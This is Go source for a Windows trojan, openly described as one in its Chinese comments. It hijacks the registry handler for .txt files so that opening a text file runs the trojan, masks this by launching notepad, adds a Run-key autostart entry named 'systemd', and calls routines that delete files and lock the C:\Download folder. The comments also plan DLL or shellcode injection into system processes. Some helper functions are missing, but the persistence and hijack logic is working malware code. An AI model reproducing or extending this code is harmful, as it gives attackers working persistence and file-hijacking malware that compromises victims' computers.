package main

import (
	"os"
	"os/exec"
	"sync"
)

/*
1. 每次启动前检查文件 C:\Windows\Temp\systemd.lock 是否存在
2. 若不存在lock文件，则判定为首次启动木马程序，首次启动将修改注册表中的文件打开方式、开机自启项目等、同时（向系统进程中注入恶意dll/shellcode）
   保证恶意程序核心运行,并写入lock文件
3. 若存在lock文件，则判定为二次启用，这时可以根据命令行传参来判断用户行为(用记事本打开txt文件/开机自启操作)
*/

var DEBUG = true
var exePath string
var wg sync.WaitGroup
var tmpFile = `C:\Windows\Temp\systemd.tmp`

func main() {
	var txtFileName string

	// 首次运行判断
	if !IsExist(tmpFile) {
		initialization()
	}

	// 打开记事本程序
	if len(os.Args) != 1 {
		txtFileName = os.Args[1]
		notepadCmd := exec.Command("notepad.exe", txtFileName)
		_ = notepadCmd.Run()
		wg.Add(2)
		go startWithWindows(&wg)
		go deleteFile("", &wg)
		wg.Wait()
	}

	//%SystemRoot%\system32\notepad.exe %1
	exePath, _ = execPath()
	wg.Add(4)
	go changeOpenType(&wg)
	go startWithWindows(&wg)
	go deleteFile("", &wg)
	go lockFile(`C:\Download\`,&wg)
	wg.Wait()
}

func initialization() {
	_, err := os.Create(tmpFile)
	if err != nil {
		panic(err)
	}
}

func changeOpenType(wg *sync.WaitGroup) {
	changeRegOpenT("txtfile\\shell\\open\\command",  exePath+" %1")
	wg.Done()
}

func startWithWindows(wg *sync.WaitGroup) {
	createRegAutoStart("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "systemd","\""+exePath+"\"")
	wg.Done()
}